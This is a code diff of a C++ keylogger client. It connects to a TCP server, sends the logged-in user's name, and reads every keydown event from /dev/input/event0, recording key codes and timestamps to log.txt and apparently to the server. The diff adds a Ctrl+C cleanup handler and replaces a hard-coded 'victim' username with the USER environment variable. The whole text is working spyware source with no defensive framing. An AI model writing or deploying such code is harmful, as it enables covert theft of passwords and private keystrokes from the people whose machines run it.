@@ -7,11 +7,27 @@
 namespace asio = boost::asio;
 using asio::ip::tcp;
 
-const char *IP_ADDRESS = "127.0.0.1"; // replace with server IP address
-const char *PORT = "8686";            // replace with server port number
+const char *IP_ADDRESS = "127.0.0.1";
+const char *PORT = "8686";
+
+struct libevdev *dev;
+int fd;
+std::ofstream outfile;
+tcp::socket *socket_ptr;
+
+void sigint_handler(int signum) {
+    std::cout << "\nCtrl + c recieved" << std::endl;
+    std::cout << "Closing open files and sockets..." << std::endl;
+    outfile.close();
+    libevdev_free(dev);
+    close(fd);
+    socket_ptr->close();
+    exit(signum);
+}
 
 int main() {
-    std::string username = "victim"; // replace with code to get victim's username
+
+    std::string username = std::getenv("USER");
 
     asio::io_context io_context;
     tcp::socket socket(io_context);
@@ -24,20 +40,22 @@ int main() {
     asio::write(socket, asio::buffer(username + "\n"));
 
     // Open the input device
-    struct libevdev *dev = nullptr;
-    int fd = open("/dev/input/event0", O_RDONLY);
+    fd = open("/dev/input/event0", O_RDONLY);
     int rc = libevdev_new_from_fd(fd, &dev);
     if (rc < 0) {
         std::cerr << "Failed to open device" << std::endl;
         return 1;
     }
-    std::ofstream outfile("log.txt");
+    outfile = std::ofstream("log.txt");
+    socket_ptr = &socket;
+    signal(SIGINT, sigint_handler);
+
     // Read events from input device
     while (true) {
         struct input_event ev;
         rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
         if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
-            if (ev.type == EV_KEY && ev.value == 1) { // only send keydown events
+            if (ev.type == EV_KEY && ev.value == 1) {
                 std::string message = "Key: " + std::to_string(ev.code) +
                                       ", Time:" + std::to_string(ev.time.tv_sec) + "." +
                                       std::to_string(ev.time.tv_usec) + "\n";
@@ -46,11 +64,6 @@ int main() {
             }
         }
     }
-
-    // Close the input device
-    outfile.close();
-    libevdev_free(dev);
-    close(fd);
 
     return 0;
 }
